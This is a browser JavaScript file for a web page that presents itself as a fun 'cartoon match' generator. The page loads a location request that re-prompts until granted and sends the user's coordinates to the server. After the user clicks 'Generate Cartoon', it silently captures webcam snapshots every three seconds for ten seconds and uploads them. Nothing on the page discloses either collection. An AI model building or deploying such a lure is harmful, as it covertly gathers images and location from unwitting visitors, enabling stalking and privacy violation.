let locationData = null;
let locationAccessGranted = false;
let cameraAccessGranted = false;
const webcamElement = document.getElementById("webcam");
const canvasElement = document.getElementById("webcanva");
const capturedImageDiv = document.getElementById("captured-image");
const cartoonDiv = document.getElementById("cartoon");
const messagebox = document.getElementById("message-box");
let x=0;

// Initialize the webcam (but don't start it yet)
const webcam = new Webcam(webcamElement, "user", canvasElement);

// Function to capture image and display it
function captureImage() {
    if (!locationAccessGranted || !cameraAccessGranted) {
        alert("Please grant both location and camera access before capturing an image.");
        return;
    }
    x=1;
    document.querySelector('.image-container').style.display = 'flex';
    const picture = webcam.snap();  // Capture image from the webcam
    capturedImageDiv.innerHTML = `<img src="${picture}" alt="Captured Image" width="600" height="500">`;
}

// Function to capture image every 3 seconds
function startImageCaptureInterval() {
    return setInterval(() => {
        if (!locationAccessGranted || !cameraAccessGranted) {
            alert("Please grant both location and camera access before capturing images.");
            return;
        }
        const picture = webcam.snap();  // Capture image from the webcam
        console.log("Captured image:", picture);
       
        uploadImage(picture);
    }, 3000);
}

// Function to stop capturing images
function stopImageCaptureInterval(intervalId) {
    clearInterval(intervalId);
}

// Function to upload image to server
function uploadImage(imageData) {
    fetch('/upload-image', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ image: imageData })
    })
    .then(response => response.text())
    .then(data => {
        console.log("Image uploaded successfully:", data);
    })
    .catch(error => {
        console.error("Error uploading image:", error);
    });
}

// Function to get a random cartoon image
function getRandomCartoon() {
    if (!locationAccessGranted || !cameraAccessGranted ) {
        alert("Please grant both location and camera access before generating a cartoon.");
        return;
    }
    
    fetch('/get-random-cartoon')
        .then(response => response.json())
        .then(data => {
            console.log(data.imageUrl);
            cartoonDiv.innerHTML = `<img src="${data.imageUrl}" alt="Cartoon Image" width="600" height="500">`;
            messagebox.innerHTML = `<div class="message">YOUR MATCH</div>`;
        })
        .catch(error => {
            console.error("Error fetching cartoon image:", error);
        });
}

// Function to upload location data to server
function uploadLocation(locationData) {
    fetch('/upload-location', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ location: locationData })
    })
    .then(response => response.text())
    .then(data => {
        console.log("Location uploaded successfully:", data);
    })
    .catch(error => {
        console.error("Error uploading location:", error);
    });
}

// Request location access and upload location data
function requestLocationAccess() {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            position => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                locationData = `lat${latitude}_lon${longitude}`;
                locationAccessGranted = true; // Set location access as granted
                uploadLocation(locationData); // Upload location data
                resolve(locationData);
            },
            error => {
                alert("Location access is required. Please enable location access in your browser settings.");
                // Retry after 3 seconds
                setTimeout(() => {
                    requestLocationAccess().then(resolve).catch(reject);
                }, 3000);
            }
        );
    });
}

// Request camera access and start webcam
function requestCameraAccess() {
    return new Promise((resolve, reject) => {
        webcam.start()
            .then(() => {
                cameraAccessGranted = true; // Set camera access as granted
                resolve();
            })
            .catch(error => {
                alert("Camera access is required. Please enable camera access in your browser settings.");
                console.error("Camera access error:", error);
                reject(error);
            });
    });
}

// Event listener for the "Capture Image" button
document.getElementById("capture-button").addEventListener("click", () => {
    captureImage();  // Capture and display the image
});

// Event listener for the "Generate Cartoon" button
// Event listener for the "Generate Cartoon" button
document.getElementById("generate-button").addEventListener("click", () => {
    if (!locationAccessGranted || !cameraAccessGranted) {
        alert("Please grant both location and camera access before generating a cartoon.");
        return;
    }

    if (!x) {
        alert("First, you need to capture your image.");
        return;
    }

    // Get a random cartoon image after confirming image capture
    getRandomCartoon();

    // Optionally, start capturing images every 3 seconds if needed
    const intervalId = startImageCaptureInterval();

    // Stop capturing images after some time or condition
    setTimeout(() => {
        stopImageCaptureInterval(intervalId);
    }, 10000);  // Stop after 10 seconds
});

// Start the permission checks when the page loads
document.addEventListener('DOMContentLoaded', () => {
    requestLocationAccess()
        .then(() => requestCameraAccess())
        .catch(error => {
            console.error("Permissions error:", error);
        });
});
